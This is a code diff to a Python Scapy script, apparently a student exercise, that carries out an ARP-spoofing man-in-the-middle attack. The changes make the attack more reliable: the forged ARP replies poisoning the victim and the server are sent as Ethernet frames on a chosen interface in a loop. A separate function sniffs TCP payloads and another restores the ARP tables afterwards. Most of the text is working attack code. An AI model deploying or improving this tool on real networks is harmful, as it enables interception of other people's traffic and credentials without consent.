@@ -11,7 +11,7 @@
 #                                                                              #
 # **************************************************************************** #
 
-from scapy.all import ARP, send, sniff, get_if_hwaddr, Raw
+from scapy.all import Ether, ARP, send, sniff, get_if_hwaddr, Raw, sendp
 from scapy.layers.inet import TCP
 import netifaces
 from time import sleep
@@ -27,19 +27,23 @@ def	get_default_interface():
 def	poison_loop():
 	interface = get_default_interface()
 	my_mac = get_if_hwaddr(interface)
-	arp_reply_victim = ARP(op=2, psrc=ip_target, hwsrc=my_mac, pdst=ip_src)
-	arp_reply_server = ARP(op=2, psrc=ip_src, hwsrc=my_mac, pdst=ip_target)
+	arp_reply_victim = Ether(dst=mac_src) / ARP(op=2, psrc=ip_target, hwsrc=my_mac, pdst=ip_src, hwdst=mac_src)
+	arp_reply_server = Ether(dst=mac_target) / ARP(op=2, psrc=ip_src, hwsrc=my_mac, pdst=ip_target, hwdst=mac_target)
 	try:
 		while (True):
-			send(arp_reply_server, verbose=False)
-			send(arp_reply_victim, verbose=False)
+			sendp(arp_reply_server, verbose=False, iface=interface)
+			sendp(arp_reply_victim, verbose=False, iface=interface)
 			sleep(2)
 	except KeyboardInterrupt:
 		pass
 
-def	restore_tables():
-	send(ARP(op=2, psrc=ip_src, hwsrc=mac_src, pdst=ip_target, hwdst=mac_target))
-	send(ARP(op=2, pdst=ip_src, hwdst=mac_src, psrc=ip_target, hwsrc=mac_target))
+def restore_tables():
+	interface = get_default_interface()
+	restore_victim = Ether(dst=mac_src) / ARP(op=2, psrc=ip_target, hwsrc=mac_target, pdst=ip_src, hwdst=mac_src)
+	restore_server = Ether(dst=mac_target) / ARP(op=2, psrc=ip_src, hwsrc=mac_src, pdst=ip_target, hwdst=mac_target)
+	for _ in range(3):
+		sendp(restore_victim, verbose=False, iface=interface)
+		sendp(restore_server, verbose=False, iface=interface)
 
 def process_packet(packet):
 	if packet.haslayer(TCP) and packet.haslayer(Raw):
@@ -85,4 +89,4 @@ except (Exception, KeyboardInterrupt):
 	print("STOPPING ATTACK")
 finally:
 	restore_tables()
-	print("ARP TABLES RESTORED")
+	print("\nARP TABLES RESTORED")
